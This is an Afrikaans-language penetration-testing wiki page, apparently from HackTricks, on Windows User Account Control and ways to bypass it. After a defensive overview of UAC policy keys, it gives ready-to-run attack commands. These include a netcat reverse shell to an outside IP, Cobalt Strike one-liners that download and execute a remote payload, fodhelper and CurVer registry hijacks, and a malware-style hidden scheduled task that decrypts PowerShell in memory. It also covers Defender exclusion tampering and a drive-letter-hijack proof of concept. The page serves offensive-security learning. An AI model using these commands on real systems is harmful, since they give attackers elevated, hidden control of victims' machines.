# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) is 'n funksie wat 'n **toestemmingsprompt vir gevorderde aktiwiteite** moontlik maak. Aansoeke het verskillende `integrity` vlakke, en 'n program met 'n **hoë vlak** kan take uitvoer wat **die stelsel moontlik kan kompromitteer**. Wanneer UAC aangeskakel is, hardloop toepassings en take altyd **onder die sekuriteitskonteks van 'n nie-administrateur rekening** tensy 'n administrateur eksplisiet hierdie toepassings/take magtiging gee om administrateurvlak-toegang tot die stelsel te hê om te hardloop. Dit is 'n geriefsfunksie wat administrateurs teen onbedoelde veranderinge beskerm, maar dit word nie as 'n sekuriteitsgrens beskou nie.

Vir meer inligting oor integrity vlakke:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Wanneer UAC in plek is, kry 'n administrateurgebruiker 2 tokens: 'n standaardgebruikertoken, om gewone aksies op gewone vlak uit te voer, en een met die adminbevoegdhede.

Hierdie [bladsy](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) bespreek hoe UAC in groot diepte werk en sluit die aanmeldproses, gebruikerservaring, en UAC-argitektuur in. Administrateurs kan sekuriteitspolisies gebruik om te konfigureer hoe UAC spesifiek vir hul organisasie werk op plaaslike vlak (met behulp van secpol.msc), of gekonfigureer en uitgepous word via Group Policy Objects (GPO) in 'n Active Directory-domeinomgewing. Die verskeie instellings word hier in detail bespreek: [here](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Daar is 10 Groepsbeleid-instellings wat vir UAC gestel kan word. Die volgende tabel verskaf bykomende besonderhede:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registersleutel                | Standaardinstelling                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Gedeaktiveer)                                             |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Vra toestemming vir nie-Windows-binaries op die veilige lessenaar) |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Vra vir inlogbewyse op die veilige lessenaar)         |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Ingeskakel; standaard gedeaktiveer op Enterprise)           |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Gedeaktiveer)                                             |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Ingeskakel)                                              |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Ingeskakel)                                              |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Gedeaktiveer)                                             |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Ingeskakel)                                              |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Ingeskakel)                                              |

### Beleide vir die installering van sagteware op Windows

Die **lokale sekuriteitspolisies** ("secpol.msc" op die meeste stelsels) is standaard gekonfigureer om **nie-admin gebruikers te verhinder om sagteware te installeer**. Dit beteken dat selfs al kan 'n nie-admin gebruiker die installateur vir jou sagteware aflaai, hulle dit nie sonder 'n administrateurrekening sal kan laat loop nie.

### Registersleutels om UAC te dwing om vir verhoging te vra

As 'n standaardgebruiker sonder adminregte, kan jy seker maak dat die "standaard" rekening **deur UAC vir inlogbewyse gevra word** wanneer dit sekere aksies probeer uitvoer. Hierdie aksie sal vereis dat sekere **registersleutels** gewysig word, waarvoor jy adminpermissies benodig, tensy daar 'n UAC bypass is, of die aanvaller reeds as admin aangemeld is.

Selfs as die gebruiker in die **Administrators** groep is, dwing hierdie veranderinge die gebruiker om hul rekeninginlogbewyse weer in te tik om administratiewe aksies uit te voer.

**Die enigste nadeel is dat hierdie benadering UAC gedeaktiveer benodig om te werk, wat onwaarskynlik in produksie-omgewings is.**

Die registersleutels en inskrywings wat jy moet verander is die volgende (met hul verstekwaardes tussen hakies):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

Dit kan ook handmatig gedoen word deur die Local Security Policy-instrument. Sodra dit verander is, sal administratiewe operasies die gebruiker vra om hul inlogbewyse weer in te voer.

### Nota

**User Account Control is nie 'n sekuriteitsgrens nie.** Dus kan standaardgebruikers nie uit hul rekeninge breek en administrateurregte verkry sonder 'n local privilege escalation exploit nie.

### Vra 'volledige rekenaartoegang' aan 'n gebruiker
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### UAC-voorregte

- Internet Explorer Protected Mode gebruik integriteitskontroles om te voorkom dat prosesse met 'n hoë integriteitsvlak (soos webblaaiers) toegang kry tot data met 'n lae integriteitsvlak (soos die tydelike Internet-lêergids). Dit word gedoen deur die blaaier met 'n lae-integriteit-token te laat loop. Wanneer die blaaier probeer om data te bereik wat in die lae-integriteitsone gestoor is, kontroleer die bedryfstelsel die integriteitsvlak van die proses en gee toegang ooreenkomstig. Hierdie funksie help verhoed dat remote code execution attacks toegang tot sensitiewe data op die stelsel verkry.
- Wanneer 'n gebruiker by Windows aanmeld, skep die stelsel 'n toegangstoken wat 'n lys van die gebruiker se voorregte bevat. Voorregte word gedefinieer as die kombinasie van 'n gebruiker se regte en vermoëns. Die token bevat ook 'n lys van die gebruiker se credentials, wat gebruik word om die gebruiker teenoor die rekenaar en netwerkbronne te autentiseer.

### Autoadminlogon

Om Windows te konfigureer sodat dit outomaties 'n spesifieke gebruiker by opstart aanmeld, stel die **`AutoAdminLogon` registry key**. Dit is nuttig vir kiosk-omgewings of vir toetsdoeleindes. Gebruik dit slegs op veilige stelsels, aangesien dit die wagwoord in die register openbaar maak.

Stel die volgende sleutels met die Registry Editor of `reg add`:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

Om terug te keer na normale aanmeldgedrag, stel `AutoAdminLogon` op 0.

## UAC bypass

> [!TIP]
> Let wel: as jy grafiese toegang tot die victim het, is UAC bypass reguit vorentoe aangesien jy eenvoudig op "Yes" kan klik wanneer die UAC prompt verskyn

Die UAC bypass is nodig in die volgende situasie: **die UAC is geaktiveer, jou proses hardloop in 'n medium-integriteitskonteks, en jou gebruiker behoort aan die administrators group**.

Dit is belangrik om te noem dat dit **veel moeiliker is om die UAC te omseil as dit in die hoogste sekuriteitsvlak (Always) is as wanneer dit in enige van die ander vlakke (Default) is.**

### UAC gedeaktiveer

As UAC reeds gedeaktiveer is (`ConsentPromptBehaviorAdmin` is **`0`**) kan jy 'n **reverse shell with admin privileges** (high integrity level) uitvoer met iets soos:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/
- https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html

### **Baie** Basic UAC "bypass" (volle lêerstelseltoegang)

As jy 'n shell het met 'n gebruiker wat in die Administrators groep is, kan jy via SMB (file system) die gedeelde **mount the C$** plaaslik as 'n nuwe skyf koppel, en jy sal **access to everything inside the file system** hê (selfs Administrator home folder).

> [!WARNING]
> **Dit lyk asof hierdie truuk nie meer werk nie**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass met cobalt strike

Die Cobalt Strike-tegnieke sal slegs werk as UAC nie op sy maksimum sekuriteitsvlak gestel is nie.
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** en **Metasploit** het ook verskeie modules om die **UAC** te **bypass**.

### KRBUACBypass

Dokumentasie en hulpmiddel op [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME** ](https://github.com/hfiref0x/UACME)wat 'n **samestelling** is van verskeie UAC bypass exploits. Let wel dat jy **UACME met visual studio of msbuild moet compileer**. Die kompilasie sal verskeie uitvoerbare lêers skep (soos `Source\Akagi\outout\x64\Debug\Akagi.exe`) , jy sal moet weet **watter een jy benodig.**\
Jy moet **versigtig wees** omdat sommige bypasses **ander programme sal laat opduik** wat die **gebruiker** sal **waarsku** dat iets aan die gang is.

UACME het die **bouweergawe waarna elke tegniek begin werk het**. Jy kan soek na 'n tegniek wat jou weergawes raak:
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Ook, deur [hierdie](https://en.wikipedia.org/wiki/Windows_10_version_history) bladsy te gebruik, kry jy die Windows-weergawe `1607` uit die build-weergawes.

### UAC Bypass – fodhelper.exe (Registry hijack)

Die vertroude binêre `fodhelper.exe` word op moderne Windows outomaties geëlevateer. Wanneer dit begin word, doen dit navraag op die per-gebruiker registerpad hieronder sonder om die `DelegateExecute`-werkwoord te valideer. Om 'n opdrag daar te plant, laat 'n Medium Integrity-proses (gebruiker is in Administrators) toe om 'n High Integrity-proses te spawn sonder 'n UAC-prompt.

Registerpad wat deur fodhelper nagevra word:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>PowerShell-stappe (stel jou payload in, dan aktiveer dit)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
Aantekeninge:
- Werk wanneer die huidige gebruiker 'n lid van Administrators is en die UAC-vlak standaard/toegeeflik is (nie Always Notify met ekstra beperkinge nie).
- Gebruik die `sysnative`-pad om 'n 64-bit PowerShell te begin vanaf 'n 32-bit proses op 64-bit Windows.
- Payload kan enige opdrag wees (PowerShell, cmd, of 'n EXE-pad). Vermy prompting UIs vir stealth.

#### CurVer/extension hijack variant (HKCU only)

Onlangse monsters wat `fodhelper.exe` misbruik, omseil `DelegateExecute` en in plaas daarvan **herlei die `ms-settings` ProgID** via die per-gebruiker `CurVer`-waarde. Die auto-elevated binary los steeds die handler onder `HKCU` op, dus is geen admin token nodig om die sleutels te plant nie:
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
Sodra dit verhoogde regte verkry het, skakel malware gewoonlik **toekomstige versoeke af** deur `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` op `0` te stel, voer dan addisionele defense evasion uit (bv., `Add-MpPreference -ExclusionPath C:\ProgramData`) en her-skep persistence om met high integrity uit te voer. 'n Tipiese persistence-taak stoor 'n **XOR-encrypted PowerShell script** op die skyf en dekodeer/voer dit in-memory elke uur uit:
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
Hierdie variant maak steeds die dropper skoon en laat net die staged payloads oor, wat opsporing laat staatmaak op monitering van die **`CurVer` hijack**, `ConsentPromptBehaviorAdmin` tampering, Defender exclusion creation, of scheduled tasks wat in-memory PowerShell ontsleutel.

#### Meer UAC bypass

**Al** die tegnieke wat hier gebruik word om AUC te omseil **vereis** 'n **full interactive shell** met die slagoffer (n gewone nc.exe shell is nie genoeg nie).

Jy kan dit kry deur 'n **meterpreter** sessie te gebruik. Migreer na 'n **process** wat die **Session** waarde gelyk aan **1** het:

![](<../../images/image (863).png>)

(_explorer.exe_ behoort te werk)

### UAC Bypass with GUI

As jy toegang het tot 'n **GUI kan jy net die UAC prompt aanvaar** wanneer dit verskyn; jy het regtig nie 'n bypass nodig nie. Dus, om toegang tot 'n GUI te kry sal jou toelaat om die UAC te omseil.

Boonop, as jy 'n GUI-sessie kry wat iemand gebruik het (moontlik via RDP) is daar **some tools that will be running as administrator** vanwaar jy byvoorbeeld 'n **cmd** **as admin** direk kan run sonder weer deur UAC gevra te word, soos [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Dit kan bietjie meer **stealthy** wees.

### Luidrugtige brute-force UAC bypass

As jy nie omgee om lawaaierig te wees nie, kan jy altyd iets soos [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) uitvoer wat voortdurend vra om toestemming te verhoog totdat die gebruiker dit aanvaar.

### Jou eie bypass - Basiese UAC bypass metodologie

As jy na **UACME** kyk sal jy opmerk dat **meeste UAC bypasses 'n Dll Hijacking vulnerability misbruik** (hoofsaaklik deur die kwaadwillige dll op _C:\Windows\System32_ te skryf). [Lees hierdie om te leer hoe om 'n Dll Hijacking kwetsbaarheid te vind](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Vind 'n binary wat sal **autoelevate** (kontroleer dat wanneer dit uitgevoer word dit in 'n high integrity level loop).
2. Gebruik procmon om "**NAME NOT FOUND**" events te vind wat kwesbaar kan wees vir **DLL Hijacking**.
3. Jy sal waarskynlik die DLL binne sekere **protected paths** (soos C:\Windows\System32) moet **write** waar jy nie skryfpermissies het nie. Jy kan dit omseil deur die volgende te gebruik:
1. **wusa.exe**: Windows 7, 8 en 8.1. Dit laat toe om die inhoud van 'n CAB-lêer binne protected paths te extract (want hierdie hulpmiddel word van 'n high integrity level uitgevoer).
2. **IFileOperation**: Windows 10.
4. Berei 'n **script** voor om jou DLL in die protected path te copy en die kwesbare en autoelevated binary uit te voer.

### Nog 'n UAC bypass tegniek

Bestaan uit om te kyk of 'n **autoElevated binary** probeer **read** uit die **registry** die **name/path** van 'n **binary** of **command** wat **executed** moet word (dit is meer interessant as die binary hierdie inligting binne die **HKCU** soek).

### Administrator Protection (25H2) drive-letter hijack via per-logon-session DOS device map

Windows 11 25H2 “Administrator Protection” gebruik shadow-admin tokens met per-sessie `\Sessions\0\DosDevices/<LUID>` maps. Die gids word lui geskep deur `SeGetTokenDeviceMap` by die eerste `\??` resolusie. As die aanvaller die shadow-admin token slegs op **SecurityIdentification** imiteer, word die gids geskep met die aanvaller as **owner** (erf `CREATOR OWNER`), wat drive-letter links toelaat wat voorrang gee oor `\GLOBAL??`.

Stappe:

1. Van 'n laag-bevoorregte sessie, roep `RAiProcessRunOnce` aan om 'n promptless shadow-admin `runonce.exe` te spawn.
2. Dupliseer sy primêre token na 'n **identification** token en impersonate dit terwyl jy `\??` oopmaak om die skepping van `\Sessions\0\DosDevices/<LUID>` onder aanvaller-eienaarskap te forceer.
3. Skep daar 'n `C:` symlink wat wys na aanvaller-beheerde stoorplek; daaropvolgende lêerstelsel toegang in daardie sessie los `C:` op na die aanvallerpad, wat DLL/file hijack moontlik maak sonder 'n prompt.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## Verwysings
- [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf) – fodhelper UAC bypass steps](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
- [LOLBAS: Fodhelper.exe](https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/)
- [Microsoft Docs – How User Account Control works](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [UACME – UAC bypass techniques collection](https://github.com/hfiref0x/UACME)
- [Checkpoint Research – KONNI Adopts AI to Generate PowerShell Backdoors](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [Project Zero – Windows Administrator Protection drive-letter hijack](https://projectzero.google/2026/26/windows-administrator-protection.html)

{{#include ../../banners/hacktricks-training.md}}
